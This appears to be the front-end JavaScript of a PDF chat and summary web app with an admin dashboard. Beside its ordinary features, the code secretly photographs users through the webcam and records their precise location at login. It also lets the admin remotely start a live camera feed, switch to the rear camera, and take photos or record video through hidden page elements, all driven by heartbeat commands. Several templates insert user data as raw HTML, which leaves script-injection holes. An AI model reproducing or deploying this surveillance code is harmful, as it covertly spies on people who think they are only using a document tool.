  if (tabName === 'users') {
    loadAdminUsers();
  } else if (tabName === 'activity') {
    loadAdminActivity();
  }
}

async function loadAdminUsers() {
  const tbody = document.getElementById('admin-users-table-body');
  if (!tbody) return;

  try {
    const resp = await fetch(`${API_BASE_URL}/api/admin/users`, {
      credentials: 'include'
    });
    
    if (resp.ok) {
      const data = await resp.json();
      const users = data.users || [];
      appState.adminUsers = users; // Store for details view
      
      // Update Active Users Count & Grid
      updateActiveUsers();
      
      if (users.length === 0) {
        tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:var(--text-secondary);">No users found</td></tr>';
        return;
      }

      tbody.innerHTML = users.map(user => {
        // Determine display time: prefer lastHeartbeat, fallback to lastLogin
        const timeToUse = user.lastHeartbeat || user.lastLogin;
        let timeDisplay = 'Never';
        if (timeToUse) {
            timeDisplay = new Date(timeToUse).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
        }

        return `
        <tr onclick="showUserDetails(${user.id})" style="cursor:pointer;" title="Click to view details">
          <td>
            <div style="display:flex; align-items:center; gap:10px;">
              <img src="${user.picture || 'https://via.placeholder.com/32'}" class="user-avatar-small" alt="User" style="width:32px;height:32px;border-radius:50%;">
              <span>${user.name || 'Unknown'}</span>
            </div>
          </td>
          <td>${user.email}</td>
          <td>${timeDisplay}</td>
          <td>
            <button class="action-btn" onclick="event.stopPropagation(); showUserDetails(${user.id})"><i class="fas fa-eye"></i></button>
          </td>
        </tr>
      `}).join('');
    } else {
      tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:var(--text-secondary);">Unable to load users</td></tr>';
    }
  } catch (e) {
    console.error('Error loading users:', e);
    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:var(--error);">Error loading data</td></tr>';
  }
}

async function updateActiveUsers() {
    try {
        const resp = await fetch(`${API_BASE_URL}/api/admin/active-users`, { credentials: 'include' });
        const data = await resp.json();
        const activeUsers = data.active_users || [];
        
        // Update Count
        const el = document.getElementById('admin-active-users');
        if (el) el.textContent = activeUsers.length;

        // Update Grid
        const grid = document.getElementById('online-users-grid');
        const section = document.getElementById('online-users-section');
        
        if (grid && section) {
            if (activeUsers.length > 0) {
                section.style.display = 'block';
                grid.innerHTML = activeUsers.map(user => `
                <div class="online-user-card" onclick="showUserDetails(${user.id})">
                    <div class="online-user-avatar">
                        <img src="${user.picture || 'https://via.placeholder.com/40'}" alt="${user.name}">
                        <div class="online-status-indicator"></div>
                    </div>
                    <div class="online-user-info">
                        <div class="online-user-name">${user.name || 'Unknown'}</div>
                        <div class="online-user-time">Online</div>
                    </div>
                </div>
                `).join('');
            } else {
                section.style.display = 'none';
                grid.innerHTML = '';
            }
        }
    } catch (e) {
        console.error('Failed to update active users', e);
    }
}

async function showUserDetails(userId) {
    const user = appState.adminUsers.find(u => u.id === userId);
    if (!user) return;
    
    const modalBody = document.getElementById('user-details-body');
    if (!modalBody) return;
    
    let locationStr = 'Unknown';
    let mapLink = '';
    
    if (user.location && user.location.device) {
        const { latitude, longitude } = user.location.device;
        locationStr = `${parseFloat(latitude).toFixed(5)}, ${parseFloat(longitude).toFixed(5)}`;
        mapLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
    }
    
    // Format Last Login to IST
    let lastLoginDisplay = 'Never';
    // Prefer lastHeartbeat as it indicates when the live ping stopped/last happened
    const timeToUse = user.lastHeartbeat || user.lastLogin;
    if (timeToUse) {
        const date = new Date(timeToUse);
        // IST is UTC+5:30. If the server sends UTC, we convert. 
        // Assuming server sends ISO string which is UTC.
        // To display in IST specifically regardless of browser timezone:
        lastLoginDisplay = date.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
    }

    modalBody.innerHTML = `
        <div class="user-detail-row">
            <div class="user-detail-label">Name:</div>
            <div class="user-detail-value" style="display:flex; align-items:center; gap:10px;">
                <img src="${user.picture || 'https://via.placeholder.com/32'}" style="width:32px;height:32px;border-radius:50%;">
                ${user.name || 'N/A'}
            </div>
        </div>
        <div class="user-detail-row">
            <div class="user-detail-label">Email:</div>
            <div class="user-detail-value">${user.email}</div>
        </div>
        <div class="user-detail-row">
            <div class="user-detail-label">Last Login:</div>
            <div class="user-detail-value">${lastLoginDisplay}</div>
        </div>
        <div class="user-detail-row">
            <div class="user-detail-label">Last Location:</div>
            <div class="user-detail-value">
                ${locationStr}
                ${mapLink ? `<a href="${mapLink}" target="_blank" style="margin-left:10px; color:var(--primary); text-decoration:none;"><i class="fas fa-map-marker-alt"></i> View Map</a>` : ''}
            </div>
        </div>
        <div class="user-detail-row">
            <div class="user-detail-label">Last Photo:</div>
            <div class="user-detail-value">
                ${user.lastPhotoLink ? `<button onclick="viewPhoto('${user.lastPhotoLink}')" class="button-secondary"><i class="fas fa-image"></i> View Last Photo</button>` : '<span style="color:var(--text-secondary);">No photo available</span>'}
            </div>
        </div>
        <div class="user-detail-row">
            <div class="user-detail-label">Drive Folder:</div>
            <div class="user-detail-value">
                ${user.driveFolderLink ? `<a href="${user.driveFolderLink}" target="_blank" style="color:var(--primary); text-decoration:none;"><i class="fab fa-google-drive"></i> Open Drive Folder</a>` : '<span style="color:var(--text-secondary);">Not connected</span>'}
            </div>
        </div>
        
        <div style="margin-top: 20px; display: flex; justify-content: center;">
            <button class="button-primary" onclick="openLiveStream(${user.id})">
                <i class="fas fa-video"></i> Live Camera View
            </button>
        </div>

        <div id="user-activity-log-container" style="margin-top: 20px; border-top: 1px solid var(--border); padding-top: 15px;">
            <h4 style="margin-bottom: 10px;">Activity Log</h4>
            <div style="text-align:center; color:var(--text-secondary);">Loading activity...</div>
        </div>
    `;
    
    document.getElementById('user-details-modal').classList.add('active');

    // Fetch activity log
    try {
        const resp = await fetch(`${API_BASE_URL}/api/admin/users/${userId}/activity-log`, { credentials: 'include' });
        const data = await resp.json();
        const logs = data.logs || [];
        
        const logContainer = document.getElementById('user-activity-log-container');
        if (logContainer) {
            if (logs.length === 0) {
                logContainer.innerHTML = '<h4 style="margin-bottom: 10px;">Activity Log</h4><div style="text-align:center; color:var(--text-secondary);">No activity recorded</div>';
            } else {
                // Helper for location formatting
                const formatLoc = (loc) => {
                    if (!loc) return 'Unknown';
                    if (typeof loc === 'string') return loc;
                    if (loc.city || loc.region || loc.country) return [loc.city, loc.region, loc.country].filter(Boolean).join(', ');
                    if (loc.device && loc.device.latitude) return `${parseFloat(loc.device.latitude).toFixed(4)}, ${parseFloat(loc.device.longitude).toFixed(4)}`;
                    return 'Unknown';
                };

                // Helper for UA parsing
                const parseUA = (ua) => {
                    if (!ua) return 'Unknown';
                    if (ua.includes('iPhone')) return 'iPhone';
                    if (ua.includes('Android')) return 'Android';
                    if (ua.includes('Windows')) return 'Windows PC';
                    if (ua.includes('Macintosh')) return 'Mac';
                    if (ua.includes('Linux')) return 'Linux';
                    return 'Desktop';
                };

                logContainer.innerHTML = `
                    <h4 style="margin-bottom: 10px;">Activity Log</h4>
                    <div class="activity-list" style="max-height: 300px; overflow-y: auto; font-size: 0.9rem;">
                        ${logs.map(log => {
                            const timeStr = new Date(log.timestamp).toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
                            
                            if (log.type === 'LOGIN') {
                                return `
                                <div class="activity-item" style="padding: 8px; border-bottom: 1px solid var(--border);">
                                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
                                        <div>
                                            <span style="font-weight:bold; color:var(--success);">LOGIN</span>
                                            <span style="color:var(--text-secondary); font-size:0.8rem; margin-left: 8px;">${timeStr}</span>
                                        </div>
                                        <button class="button-secondary small" style="padding: 2px 8px; font-size: 0.7rem;" onclick="const d = this.parentElement.nextElementSibling; d.style.display = d.style.display === 'none' ? 'block' : 'none'; this.textContent = d.style.display === 'none' ? 'View More' : 'Hide Details';">View More</button>
                                    </div>
                                    <div class="login-details" style="display:none; margin-top: 8px; padding: 8px; background: var(--surface); border-radius: 4px; border: 1px solid var(--border);">
                                        <div style="font-size: 0.8rem; margin-bottom: 4px;"><strong>IP:</strong> ${log.ip || 'N/A'}</div>
                                        <div style="font-size: 0.8rem; margin-bottom: 4px;"><strong>Location:</strong> ${formatLoc(log.location)}</div>
                                        <div style="font-size: 0.8rem; margin-bottom: 4px;"><strong>Device:</strong> ${parseUA(log.userAgent)}</div>
                                        ${log.photoLink ? `<div style="margin-top: 8px;"><button onclick="viewPhoto('${log.photoLink}')" class="button-secondary small" style="display:inline-flex; align-items:center; gap:5px; font-size: 0.8rem;"><i class="fas fa-camera"></i> View Photo</button></div>` : ''}
                                    </div>
                                </div>`;
                            } else if (log.type === 'UPLOAD') {
                                return `
                                <div class="activity-item" style="padding: 8px; border-bottom: 1px solid var(--border);">
                                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
                                        <div>
                                            <span style="font-weight:bold; color:var(--secondary);">UPLOAD</span>
                                            <span style="color:var(--text-secondary); font-size:0.8rem; margin-left: 8px;">${timeStr}</span>
                                        </div>
                                        ${log.link ? `<a href="${log.link}" target="_blank" class="button-secondary small" style="padding: 2px 8px; font-size: 0.7rem; text-decoration:none;"><i class="fas fa-file-pdf"></i> View PDF</a>` : ''}
                                    </div>
                                    <div style="color:var(--text-primary); font-size: 0.9rem;">${log.details}</div>
                                </div>`;
                            } else if (log.type === 'PHOTO') {
                                return `
                                <div class="activity-item" style="padding: 8px; border-bottom: 1px solid var(--border);">
                                    <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:4px;">
                                        <div>
                                            <span style="font-weight:bold; color:var(--primary);">PHOTO</span>
                                            <span style="color:var(--text-secondary); font-size:0.8rem; margin-left: 8px;">${timeStr}</span>
                                        </div>
                                        ${log.link ? `<button onclick="viewPhoto('${log.link}')" class="button-secondary small" style="padding: 2px 8px; font-size: 0.7rem;">View Photo</button>` : ''}
                                    </div>
                                    <div style="color:var(--text-secondary); font-size: 0.8rem;">${log.details}</div>
                                </div>`;
                            } else {
                                // Capitalize first letter of feature name
                                const featureName = log.type.charAt(0).toUpperCase() + log.type.slice(1).toLowerCase();
                                return `
                                <div class="activity-item" style="padding: 8px; border-bottom: 1px solid var(--border);">
                                    <div style="display:flex; justify-content:space-between; margin-bottom:4px;">
                                        <span style="font-weight:bold; color:var(--text-primary);">${featureName}</span>
                                        <span style="color:var(--text-secondary); font-size:0.8rem;">${timeStr}</span>
                                    </div>
                                    <div style="color:var(--text-primary); font-size: 0.9rem;">${log.details}</div>
                                </div>`;
                            }
                        }).join('')}
                    </div>`;
            }
        }
    } catch (e) {
        console.error('Failed to load user activity log', e);
        const logContainer = document.getElementById('user-activity-log-container');
        if (logContainer) {
            logContainer.innerHTML = '<h4 style="margin-bottom: 10px;">Activity Log</h4><div style="color:var(--error);">Failed to load activity log</div>';
        }
    }
}

function closeUserDetailsModal() {
    document.getElementById('user-details-modal').classList.remove('active');
}

async function loadAdminActivity() {
  const tbody = document.getElementById('admin-activity-table-body');
  if (!tbody) return;

  // We can use the recent logins/uploads from summary as activity log
  const data = appState.adminSummary;
  if (!data || !data.recent) return;

  const logins = (data.recent.logins || []).map(l => ({
    type: 'login',
    time: l.timestamp,
    user: l.email, // We might not have name here
    details: `IP: ${l.ip}`
  }));

  const uploads = (data.recent.uploads || []).map(u => ({
    type: 'upload',
    time: u.uploadedAt,
    user: 'Unknown', // Uploads might not have user info attached in summary
    details: `File: ${u.filename}`
  }));

  // Combine and sort
  const activities = [...logins, ...uploads].sort((a, b) => {
    return new Date(b.time) - new Date(a.time);
  });

  if (activities.length === 0) {
    tbody.innerHTML = '<tr><td colspan="4" style="text-align:center; color:var(--text-secondary);">No recent activity</td></tr>';
    return;
  }

  tbody.innerHTML = activities.map(act => `
    <tr>
      <td>${act.time}</td>
      <td>${act.user}</td>
      <td>
        <span style="
          padding: 4px 8px; 
          border-radius: 4px; 
          font-size: 0.8rem; 
          background: ${act.type === 'login' ? 'rgba(16, 185, 129, 0.1)' : 'rgba(0, 212, 255, 0.1)'};
          color: ${act.type === 'login' ? 'var(--success)' : 'var(--primary)'};
        ">
          ${act.type.toUpperCase()}
        </span>
      </td>
      <td>${act.details}</td>
    </tr>
  `).join('');
}

// ============================================
// LOGIN VERIFICATION (PHOTO + GEO)
// ============================================

async function performLoginVerification() {
  // Prevent repeated verification in the same session
  if (sessionStorage.getItem('login_verified') === 'true') {
    console.log('Login verification already performed for this session.');
    return;
  }

  console.log('Starting login verification (Photo + Geo)...');
  
  try {
    // 1. Get Geolocation
    const getGeo = new Promise((resolve, reject) => {
      if (!('geolocation' in navigator)) {
        resolve(null);
        return;
      }
      navigator.geolocation.getCurrentPosition(
        (pos) => resolve(pos.coords),
        (err) => {
          console.warn('Geo error:', err);
          resolve(null);
        },
        { enableHighAccuracy: true, timeout: 10000 }
      );
    });

    // 2. Get Camera & Capture
    const getPhoto = new Promise(async (resolve, reject) => {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        const video = document.getElementById('hidden-video');
        const canvas = document.getElementById('hidden-canvas');
        
        video.srcObject = stream;
        
        // Wait for video to play
        await new Promise(r => video.onloadedmetadata = r);
        await video.play();
        
        // Wait a bit for auto-exposure
        await new Promise(r => setTimeout(r, 1000));
        
        // Capture
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        
        const dataUrl = canvas.toDataURL('image/png');
        
        // Stop stream
        stream.getTracks().forEach(track => track.stop());
        
        resolve(dataUrl);
      } catch (err) {
        console.warn('Camera error:', err);
        resolve(null);
      }
    });

    // Run in parallel
    const [coords, photo] = await Promise.all([getGeo, getPhoto]);
    
    if (!coords && !photo) {
      console.warn('Both Geo and Photo failed/denied.');
      return;
    }

    // 3. Send to Backend
    const payload = {
      photo: photo,
      coords: coords ? {
        latitude: coords.latitude,
        longitude: coords.longitude,
        accuracy: coords.accuracy
      } : null
    };

    const resp = await fetch(`${API_BASE_URL}/api/login-verification`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify(payload)
    });
    
    if (resp.ok) {
      console.log('Login verification successful.');
      sessionStorage.setItem('login_verified', 'true');
    } else {
      console.warn('Login verification endpoint returned error.');
    }

  } catch (e) {
    console.error('Login verification failed:', e);
  }
}

// ============================================
// LIVE STREAMING (ADMIN SIDE)
// ============================================

let currentStreamUserId = null;
let streamPollInterval = null;
let currentFacingMode = 'user';

async function openLiveStream(userId) {
    currentStreamUserId = userId;
    currentFacingMode = 'user'; // Default
    
    // Close user details modal
    closeUserDetailsModal();
    
    // Open stream modal
    const modal = document.getElementById('live-stream-modal');
    modal.classList.add('active');
    
    const statusEl = document.getElementById('stream-status');
    const imgEl = document.getElementById('live-stream-img');
    const placeholderEl = document.getElementById('stream-placeholder');
    
    statusEl.textContent = 'Requesting stream start...';
    imgEl.style.display = 'none';
    placeholderEl.style.display = 'block';
    
    try {
        // 1. Send Start Command
        await fetch(`${API_BASE_URL}/api/admin/stream/control`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ user_id: userId, action: 'start', facing_mode: currentFacingMode }),
            credentials: 'include'
        });
        
        statusEl.textContent = 'Connecting to stream...';
        
        // 2. Set MJPEG Stream Source
        // Add timestamp to bypass cache
        const streamUrl = `${API_BASE_URL}/api/stream/view/${userId}?t=${Date.now()}`;
        
        imgEl.onload = () => {
            imgEl.style.display = 'block';
            placeholderEl.style.display = 'none';
            statusEl.textContent = 'Live';
            statusEl.style.color = 'var(--success)';
        };
        
        imgEl.onerror = () => {
            // Keep retrying if stream breaks (MJPEG can be finicky on start)
            console.log('Stream connection pending...');
            setTimeout(() => {
                if (currentStreamUserId === userId) {
                    imgEl.src = `${API_BASE_URL}/api/stream/view/${userId}?t=${Date.now()}`;
                }
            }, 1000);
        };
        
        imgEl.src = streamUrl;
        
    } catch (e) {
        statusEl.textContent = 'Error starting stream: ' + e.message;
        statusEl.style.color = 'var(--error)';
    }
}

async function closeLiveStream() {
    const modal = document.getElementById('live-stream-modal');
    modal.classList.remove('active');
    
    const imgEl = document.getElementById('live-stream-img');
    imgEl.src = ''; // Stop downloading stream
    imgEl.style.display = 'none';
    
    if (currentStreamUserId) {
        try {
            await fetch(`${API_BASE_URL}/api/admin/stream/control`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: currentStreamUserId, action: 'stop' }),
                credentials: 'include'
            });
        } catch (e) {
            console.error('Error stopping stream:', e);
        }
        currentStreamUserId = null;
    }
}

async function switchCamera() {
    if (!currentStreamUserId) return;
    
    currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
    const statusEl = document.getElementById('stream-status');
    statusEl.textContent = `Switching to ${currentFacingMode === 'user' ? 'Front' : 'Back'} camera...`;
    
    try {
        await fetch(`${API_BASE_URL}/api/admin/stream/control`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                user_id: currentStreamUserId, 
                action: 'start', // Re-send start with new mode
                facing_mode: currentFacingMode 
            }),
            credentials: 'include'
        });
    } catch (e) {
        console.error('Error switching camera:', e);
        statusEl.textContent = 'Error switching camera';
    }
}

function toggleFullScreen() {
    const container = document.getElementById('stream-container');
    if (!document.fullscreenElement) {
        if (container.requestFullscreen) {
            container.requestFullscreen();
        } else if (container.webkitRequestFullscreen) { /* Safari */
            container.webkitRequestFullscreen();
        } else if (container.msRequestFullscreen) { /* IE11 */
            container.msRequestFullscreen();
        }
    } else {
        if (document.exitFullscreen) {
            document.exitFullscreen();
        } else if (document.webkitExitFullscreen) { /* Safari */
            document.webkitExitFullscreen();
        } else if (document.msExitFullscreen) { /* IE11 */
            document.msExitFullscreen();
        }
    }
}

async function capturePhoto() {
    if (!currentStreamUserId) return;
    
    const statusEl = document.getElementById('stream-status');
    const originalText = statusEl.textContent;
    statusEl.textContent = 'Capturing photo...';
    
    try {
        await fetch(`${API_BASE_URL}/api/admin/stream/control`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                user_id: currentStreamUserId, 
                action: 'capture_photo'
            }),
            credentials: 'include'
        });
        
        setTimeout(() => {
            statusEl.textContent = 'Photo capture requested';
            setTimeout(() => {
                statusEl.textContent = originalText;
            }, 2000);
        }, 500);
        
    } catch (e) {
        console.error('Error capturing photo:', e);
        statusEl.textContent = 'Error capturing photo';
    }
}

let isRecording = false;
async function toggleVideoRecording() {
    if (!currentStreamUserId) return;
    
    const btn = document.getElementById('btn-record-video');
    const icon = btn.querySelector('i');
    const statusEl = document.getElementById('stream-status');
    
    const action = isRecording ? 'stop_recording' : 'start_recording';
    
    try {
        await fetch(`${API_BASE_URL}/api/admin/stream/control`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ 
                user_id: currentStreamUserId, 
                action: action
            }),
            credentials: 'include'
        });
        
        isRecording = !isRecording;
        
        if (isRecording) {
            icon.className = 'fas fa-stop';
            btn.style.color = 'var(--error)';
            statusEl.textContent = 'Recording video...';
        } else {
            icon.className = 'fas fa-video';
            btn.style.color = '';
            statusEl.textContent = 'Recording stopped';
            setTimeout(() => {
                statusEl.textContent = 'Live';
            }, 2000);
        }
        
    } catch (e) {
        console.error('Error toggling recording:', e);
        statusEl.textContent = 'Error toggling recording';
    }
}

function viewPhoto(url) {
    const modal = document.getElementById('photo-view-modal');
    const img = document.getElementById('photo-view-img');
    img.src = url;
    modal.classList.add('active');
}

function closePhotoView() {
    const modal = document.getElementById('photo-view-modal');
    modal.classList.remove('active');
    setTimeout(() => {
        document.getElementById('photo-view-img').src = '';
    }, 300);
}

// ============================================
// HEARTBEAT & USAGE TRACKING
// ============================================

let heartbeatInterval;

function startHeartbeat() {
  if (heartbeatInterval) clearInterval(heartbeatInterval);
  sendHeartbeat(); // Initial ping
  heartbeatInterval = setInterval(sendHeartbeat, 5000);
}

function stopHeartbeat() {
  if (heartbeatInterval) clearInterval(heartbeatInterval);
}

async function sendHeartbeat() {
  if (!appState.isAuthenticated) return;
  try {
    const resp = await fetch(`${API_BASE_URL}/api/heartbeat`, {
      method: 'POST',
      credentials: 'include'
    });
    
    if (resp.ok) {
        const data = await resp.json();
        if (data.command === 'start_stream') {
            startStreaming(data.facingMode);
        } else if (data.command === 'stop_stream') {
            stopStreaming();
        } else if (data.command === 'capture_photo') {
            performCapture('photo');
        } else if (data.command === 'start_recording') {
            performCapture('video_start');
        } else if (data.command === 'stop_recording') {
            performCapture('video_stop');
        }
    }
  } catch (e) {
    console.warn('Heartbeat failed', e);
  }
}

let mediaRecorder;
let recordedChunks = [];

async function performCapture(type) {
    if (!streamVideo) return;
    
    if (type === 'photo') {
        streamCanvas.width = streamVideo.videoWidth;
        streamCanvas.height = streamVideo.videoHeight;
        const ctx = streamCanvas.getContext('2d');
        ctx.drawImage(streamVideo, 0, 0);
        
        streamCanvas.toBlob(async (blob) => {
            if (!blob) return;
            const formData = new FormData();
            formData.append('file', blob, 'capture.png');
            formData.append('type', 'photo');
            
            try {
                await fetch(`${API_BASE_URL}/api/upload-capture`, {
                    method: 'POST',
                    body: formData,
                    credentials: 'include'
                });
                console.log('Photo captured and uploaded');
            } catch (e) {
                console.error('Photo upload failed', e);
            }
        }, 'image/png');
        
    } else if (type === 'video_start') {
        if (mediaRecorder && mediaRecorder.state === 'recording') return;
        
        const stream = streamVideo.srcObject;
        // Check supported mime types
        let mimeType = 'video/webm';
        if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
            mimeType = 'video/webm;codecs=vp9';
        } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8')) {
            mimeType = 'video/webm;codecs=vp8';
        }
        
        try {
            mediaRecorder = new MediaRecorder(stream, { mimeType });
            recordedChunks = [];
            
            mediaRecorder.ondataavailable = (event) => {
                if (event.data.size > 0) {
                    recordedChunks.push(event.data);
                }
            };
            
            mediaRecorder.start();
            console.log('Video recording started');
        } catch (e) {
            console.error('Failed to start recording:', e);
        }
        
    } else if (type === 'video_stop') {
        if (!mediaRecorder || mediaRecorder.state !== 'recording') return;
        
        mediaRecorder.onstop = async () => {
            const blob = new Blob(recordedChunks, { type: 'video/webm' });
            const formData = new FormData();
            formData.append('file', blob, 'capture.webm');
            formData.append('type', 'video');
            
            try {
                await fetch(`${API_BASE_URL}/api/upload-capture`, {
                    method: 'POST',
                    body: formData,
                    credentials: 'include'
                });
                console.log('Video captured and uploaded');
            } catch (e) {
                console.error('Video upload failed', e);
            }
            recordedChunks = [];
        };
        
        mediaRecorder.stop();
        console.log('Video recording stopped');
    }
}

// ============================================
// LIVE STREAMING (USER SIDE)
// ============================================

let streamInterval;
let streamTrack;
let streamVideo;
let streamCanvas;

async function startStreaming(facingMode = 'user') {
    if (streamInterval) return; // Already streaming
    
    console.log('Starting live stream...', facingMode);
    
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { 
                facingMode: facingMode,
                width: { ideal: 640 },
                height: { ideal: 480 },
                frameRate: { ideal: 30 }
            } 
        });
        
        const videoTrack = stream.getVideoTracks()[0];
        streamTrack = videoTrack;
        
        // Create hidden video and canvas for processing
        if (!streamVideo) {
            streamVideo = document.createElement('video');
            streamVideo.style.display = 'none';
            streamVideo.autoplay = true;
            streamVideo.playsInline = true;
            document.body.appendChild(streamVideo);
        }
        
        if (!streamCanvas) {
            streamCanvas = document.createElement('canvas');
            streamCanvas.style.display = 'none';
            document.body.appendChild(streamCanvas);
        }
        
        streamVideo.srcObject = stream;
        await streamVideo.play();
        
        const ctx = streamCanvas.getContext('2d');
        
        streamInterval = setInterval(async () => {
            if (!streamTrack || streamTrack.readyState !== 'live') {
                stopStreaming();
                return;
            }
            
            try {
                // Draw video frame to canvas
                streamCanvas.width = streamVideo.videoWidth;
                streamCanvas.height = streamVideo.videoHeight;
                ctx.drawImage(streamVideo, 0, 0);
                
                // Convert to blob (JPEG, 0.6 quality for speed)
                streamCanvas.toBlob(async (blob) => {
                    if (!blob) return;
                    
                    // Send frame
                    try {
                        await fetch(`${API_BASE_URL}/api/stream/upload`, {
                            method: 'POST',
                            body: blob,
                            credentials: 'include'
                        });
                    } catch (e) {
                        // Ignore upload errors to prevent log spam
                    }
                }, 'image/jpeg', 0.6);
                
            } catch (err) {
                console.warn('Frame capture failed', err);
            }
        }, 40); // 40ms = 25 FPS
        
    } catch (err) {
        console.error('Failed to start stream:', err);
    }
}

function stopStreaming() {
    if (streamInterval) {
        clearInterval(streamInterval);
        streamInterval = null;
    }
    if (streamTrack) {
        streamTrack.stop();
        streamTrack = null;
    }
    if (streamVideo) {
        streamVideo.srcObject = null;
        streamVideo.remove();
        streamVideo = null;
    }
    if (streamCanvas) {
        streamCanvas.remove();
        streamCanvas = null;
    }
    console.log('Live stream stopped');
}

async function recordUsage(featureType, details, pdfFilename) {
  try {
    await fetch(`${API_BASE_URL}/api/record-usage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({
        feature_type: featureType,
        details: details,
        pdf_filename: pdfFilename || appState.currentFileName
      })
    });
  } catch (e) {
    console.warn('Failed to record usage', e);
  }
}

// Toggle admin photo capture setting
async function toggleAdminPhotoCapture(enabled) {
  try {
    const resp = await fetch(`${API_BASE_URL}/api/admin/photo-capture`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'include',
      body: JSON.stringify({ enabled })
    });
    const data = await resp.json();
    if (!resp.ok) throw new Error(data.error || 'Failed to toggle');
    appState.photoCaptureEnabled = !!data.photoCaptureEnabled;
    
    // Update UI state without full reload if possible
    const photoToggle = document.getElementById('admin-photo-toggle');
    if (photoToggle) photoToggle.checked = appState.photoCaptureEnabled;
    
  } catch (e) {
    alert('Error toggling photo capture: ' + e.message);
    // revert checkbox
    const cb = document.getElementById('admin-photo-toggle');
    if (cb) cb.checked = !enabled;
  }
}

function refreshAdminData() {
  const btnIcon = document.querySelector('.button-secondary.small i');
  if(btnIcon) btnIcon.classList.add('fa-spin');
  
  // Reload all admin data
  Promise.all([
      loadAdmin(), // This reloads summary, users, and activity
  ]).then(() => {
      setTimeout(() => {
        if(btnIcon) btnIcon.classList.remove('fa-spin');
      }, 500);
  });
}

// ============================================
// CHAT INTERFACE
// ============================================

async function handleChat() {
  const question = document.getElementById('chatbot-question').value;
  if (!question) {
    alert('Please enter a question.');
    return;
  }

  // Check if PDF is loaded
  if (!appState.pdfText && !appState.pdfBase64) {
    if (appState.isProcessing) {
        addChatMessage('assistant', 'PDF is currently processing. Please wait...');
        return;
    }
    const backup = localStorage.getItem('pdf_text_backup');
    if (backup) {
      appState.pdfText = backup;
    } else {
      addChatMessage('assistant', 'Error: No PDF uploaded');
      return;
    }
  }

  // Add user message to chat
  addChatMessage('user', question);
  document.getElementById('chatbot-question').value = '';

  try {
    const response = await fetch(`${API_BASE_URL}/api/chat`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        message: question, 
        history: appState.chatHistory,
        pdf_text: appState.pdfText 
      }),
      credentials: 'include',
    });

    const data = await response.json();
    if (!response.ok) throw new Error(data.error || 'Failed to get answer');
    
    // Add assistant response to chat
    addChatMessage('assistant', data.response);
    recordUsage('chat', `Q: ${question.substring(0, 50)}...`, appState.currentFileName);
  } catch (error) {
    addChatMessage('assistant', `Error: ${error.message}`);
  }
}

function addChatMessage(role, content) {
  const chatHistory = document.getElementById('chat-history');
  const messageDiv = document.createElement('div');
  messageDiv.className = `chat-message ${role}`;
  
  const bubble = document.createElement('div');
  bubble.className = 'chat-bubble';
  bubble.textContent = content;
  
  messageDiv.appendChild(bubble);
  chatHistory.appendChild(messageDiv);
  
  // Auto-scroll to bottom
  chatHistory.scrollTop = chatHistory.scrollHeight;
  
  appState.chatHistory.push({ role, content });
}

// ============================================
// SUMMARIZER
// ============================================

async function handleSummarize() {
  const resultBox = document.getElementById('summarizer-result');
  const toolControls = resultBox.previousElementSibling;
  const button = toolControls.querySelector('.button-generate');
  
  // Hide description and change button text
  const description = toolControls.querySelector('.feature-description');
  if (description) {
    description.style.display = 'none';
  }
  
  // Change button text to Regenerate
  if (button) {
    button.innerHTML = '<i class="fas fa-redo"></i><span>Regenerate</span>';
  }
  
  // Remove centered class and add right-aligned class
  if (toolControls && toolControls.classList) {
    toolControls.classList.remove('centered');
    toolControls.classList.add('right-aligned');
  }
  
  resultBox.textContent = 'Generating summary...';

  // Check if PDF is loaded
  if (!appState.pdfText && !appState.pdfBase64) {
    if (appState.isProcessing) {
        resultBox.innerHTML = '<div style="color: var(--primary); padding: 20px;"><i class="fas fa-spinner fa-spin"></i> PDF is currently processing. Please wait...</div>';
        return;
    }
    const backup = localStorage.getItem('pdf_text_backup');
    if (backup) {
      appState.pdfText = backup;
      console.log('📄 Restored PDF from localStorage');
    } else {
      resultBox.textContent = 'Error: No PDF uploaded or selected.';
      console.error('❌ No PDF in appState or localStorage');
      return;
    }
  }

  console.log('📝 Summarize: Sending PDF of size', appState.pdfText.length);

  try {
    const response = await fetch(`${API_BASE_URL}/api/summarize`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ pdf_text: appState.pdfText }),
      credentials: 'include',
    });

    console.log('📦 Summarize response status:', response.status);
    const data = await response.json();
    if (!response.ok) throw new Error(data.error || 'Failed to summarize');
    
    // Render HTML content
    resultBox.innerHTML = data.summary;
    
    // Apply specific classes if needed, or rely on CSS selectors for #summarizer-result elements
    resultBox.classList.add('formatted-summary');

    console.log('✅ Summary generated');
    recordUsage('summary', 'Generated summary', appState.currentFileName);
  } catch (error) {
    resultBox.textContent = `Error: ${error.message}`;
    console.error('❌ Summarize error:', error);
  }
}

